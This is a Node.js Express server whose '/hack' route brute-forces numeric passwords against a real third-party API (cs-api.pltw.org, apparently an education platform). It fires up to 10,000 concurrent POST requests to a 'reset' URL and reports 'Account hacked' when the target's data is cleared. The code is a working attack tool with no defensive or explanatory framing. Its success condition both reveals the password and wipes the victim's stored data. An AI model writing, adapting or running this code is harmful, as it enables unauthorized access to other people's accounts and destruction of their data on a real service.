import express from "express";
import path from "path";
import readline from "readline";
import { fileURLToPath } from "url";

const app = express();
const port = process.env.PORT || 80;

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

app.use(express.json());

app.post("/hack", async (req, res) => {
  const data = req.body;
  console.log(data);

  const payload = { text: await hack(data.endpoint) };
  res.json(payload);
  console.log(payload);
});

async function hack(endpoint, max = 9999, limit = 100) {
  let finished = false;
  let active = 0;
  let index = 0;

  return new Promise((resolve, reject) => {
    let completed = 0;

    function next() {
      if (finished) return;
      if (completed > max) {
        finished = true;
        return reject("Password not found");
      }

      while (active < limit && index <= max) {
        ++active;

        fetch(
          "https://cs-api.pltw.org/" + endpoint + "/reset?password=" + index,
          { method: "POST" }
        )
          .then(async (r) => {
            return { body: await r.text(), url: r.url };
          })
          .then((data) => {
            if (finished) return;
            if (
              data.body ==
              "Data for endpoint " + endpoint + " has been cleared."
            ) {
              let password = data.url.substring(data.url.lastIndexOf("=") + 1);
              finished = true;
              return resolve("Account hacked, password: " + password);
            }
          })
          .catch((err) => {
            finished = true;
            return reject(`Error: ${err}`);
          })
          .finally(() => {
            --active;
            ++completed;
            next(); // schedule more
          });

        ++index;
      }
    }

    next(); // start it
  });
}

app.post("/get", async (req, res) => {
  const data = req.body;
  console.log(data);

  const payload = { text: await getData(data.endpoint) };
  res.json(payload);
  console.log(payload);
});

async function getData(endpoint) {
  const response = await fetch("https://cs-api.pltw.org/" + endpoint);
  return response.text();
}

app.use(express.static(path.join(__dirname, "public")));

const server = app.listen(port, () => {
  console.log(`Server is running on port ${port}`);

  // Only do this when running locally
  if (!process.env.RENDER) {
    console.log("\nPress Enter to stop the server");
    waitForInput();
  }
});

function waitForInput() {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });

  rl.on("line", () => {
    console.log("Stopping server...");
    server.close(() => {
      console.log("Server stopped");
      process.exit(0);
    });
  });
}
